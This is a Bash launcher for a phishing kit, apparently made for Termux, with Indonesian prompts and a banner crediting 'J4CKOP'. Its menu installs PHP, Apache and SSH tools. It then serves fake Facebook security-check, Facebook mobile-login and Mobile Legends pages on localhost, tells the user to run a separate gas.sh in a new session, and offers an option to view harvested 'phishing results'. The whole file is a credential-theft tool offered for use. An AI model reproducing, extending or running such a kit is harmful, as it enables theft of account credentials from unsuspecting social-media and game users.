clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning

toilet -f future "Web phising free" | lolcat
echo $me"author J4CKOP"
echo $me"subscribe youtube.com/Mr J4CKOP"

python2 pw.py
clear

echo $bi"_______________________________________"
toilet -f future "WEB PHISING"
figlet J4CKOP T00LS
toilet -f future "Fb : Azis Wirahadi "
echo $bi"_______________________________________"
sleep 1
echo
echo $pu" server sedang started :"
echo $me"[" $ku"?" $pur"]" $ku" Buka new session"
echo $me"[" $ku"?" $pur"]" $ku" Jalankan gas.sh"
echo $bi"____________________________________"
echo $me"["$pur"1"$me"]"$pu" INSTALL ALL MODULES NEEDED"
echo $me"["$pur"2"$me"]"$pu" CEK KEAMANAN FB"
echo $me"["$pur"3"$me"]"$pu" LOGIN FB"
echo $me"["$pur"4"$me"]"$pu" MOBILE LEGENDS"
echo $me"["$pur"5"$me"]"$pu" UPDATE"
echo $me"["$pur"6"$me"]"$pu" CEK HASIL PHISHING"
echo $me"["$pur"0"$me"]"$pu" EXIT"
echo $me"____________________________________"
echo $me"╭─["$pur"root@user"$me"]"
read -p"╰─>> " pil

if [ $pil = 1 ]; then
    pkg update
    pkg upgrade
    apt-get install bash
    apt install apache2
    pkg install nano
    pkg install python2
    pkg install ruby toilet figlet
    gem install lolcat
    apt install openssh
    apt install autossh
    pkg install php
    echo $pu"all modules sudah terinstall"
    sleep 3
    sh run.sh
fi

if [ $pil = 2 ]; then
    echo $pu"Wait beb......."
    sleep 1.5
    echo $pu"buka new session sekarang dan jalankan gas.sh"
    echo $me"__________________________________"
    sleep 1.5
    echo $pu"  PHISING FACEBOOK SECURITY CHECK  "
    php -S localhost:8080 -t ~/Webp/V1
fi

if [ $pil = 3 ]; then
    echo $pu"Wait beb......."
    sleep 1
    echo $pu"buka new session sekarang dan jalankan gas.sh"
    echo $me"_________________________________"
    echo $pu"  PHISING FACEBOOK MOBILE LOGIN"
    php -S localhost:8080 -t ~/Webp/V2
fi

if [ $pil = 4 ]; then
    echo $pu"Wait beb......."
    sleep 1
    echo $pu"buka new session sekarang dan jalankan gas.sh"
    echo $me"_________________________________"
    echo $pu"  PHISING MOBILE LEGEND"
    php -S localhost:8080 -t ~/Webp/ML
fi

if [ $pil = 5 ]; then
    git pull
fi

if [ $pil = 6 ]; then
    cd ~/Webp
    sh hasil.sh
fi

if [ $pil = 0 ]; then
    echo $i"\n\nThanks Udah Gunakan Tools Ini"
    sleep 2
    echo $me"SUBSCRIBE MY CHANNEL www.youtube.com/Mr J4CKOP\n\n"
    sleep 1
    exit
fi
